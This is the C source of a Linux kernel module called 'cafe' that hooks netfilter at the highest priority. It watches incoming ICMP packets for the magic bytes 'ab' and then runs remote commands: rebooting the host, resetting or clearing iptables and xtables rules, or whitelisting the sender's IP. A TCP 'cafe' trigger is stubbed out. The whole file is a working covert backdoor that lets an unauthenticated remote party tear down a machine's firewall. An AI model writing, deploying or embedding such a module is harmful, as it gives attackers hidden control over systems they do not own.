#include <linux/module.h>
#include <linux/moduleparam.h>
#include <linux/skbuff.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/icmp.h>
#include <linux/udp.h>
#include <linux/netfilter_ipv4.h>
#include <linux/netfilter.h>
#include <linux/netfilter/x_tables.h>
#include <linux/reboot.h>
#include "cafe_icmp.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("netrikare");
MODULE_DESCRIPTION("cafe");

static struct nf_hook_ops nfho;

unsigned int nf_hook_func(const struct nf_hook_ops *ops,
        struct sk_buff *skb,
        const struct net_device *in,
        const struct net_device *out,
        int (*okfn)(struct sk_buff *)) {

    struct iphdr *iph;
    struct tcphdr *tcph;
    struct icmphdr *icmph;
    char *data;

    if (skb == NULL)
        return -1;

    iph = ip_hdr(skb);

    if (iph->protocol == IPPROTO_ICMP) {
        icmph = icmp_hdr(skb);
        data = (char *) ((char*) icmph + sizeof (struct icmphdr) + 16); // data in icmp starts here

        if (data[0] == 'a' && data[1] == 'b') {
            printk(KERN_INFO "[cafe] Received command: %x from: %pI4 proto: %d\n", data[2], &iph->saddr, iph->protocol);

            switch (data[2]) {
                case 'a':
                    cafe_reboot();
                    break;
                case 'b':
                    cafe_reset_iptables();
                    break;
                case 'c':
                    cafe_allow_ip(iph->saddr);
                    break;
                case 'd':
                    cafe_clean_xtables();
                    break;
                default:
                    //unknown command
                    break;
            }
        }

    } else if (iph->protocol == IPPROTO_TCP) {
        tcph = tcp_hdr(skb);
        data = (char *) ((unsigned char *) tcph + (tcph->doff * 4));
        if (data[0] == 'c' && data[1] == 'a' && data[2] == 'f' && data[3] == 'e') {
            printk(KERN_INFO "[cafe] Received command: %x%x%x%x from: %pI4 proto: %d\n", data[0], data[1], data[2], data[3], &iph->saddr, iph->protocol);
            //mega TODO
        }
    } else {
        //printk(KERN_INFO "[cafe] Protocol: %d\n", iph->protocol);
    }



    return NF_ACCEPT;
}

static int __init mod_init(void) {
    nfho.hook = nf_hook_func;
    nfho.hooknum = NF_INET_PRE_ROUTING;
    nfho.pf = PF_INET;
    nfho.priority = NF_IP_PRI_FIRST;
    nf_register_hook(&nfho);
    printk(KERN_INFO "[cafe] Module loaded.\n");
    return 0;
}

static void __exit mod_exit(void) {
    nf_unregister_hook(&nfho);
    printk(KERN_INFO "[cafe] Module unloaded.\n");
    return;
}

module_init(mod_init);
module_exit(mod_exit);
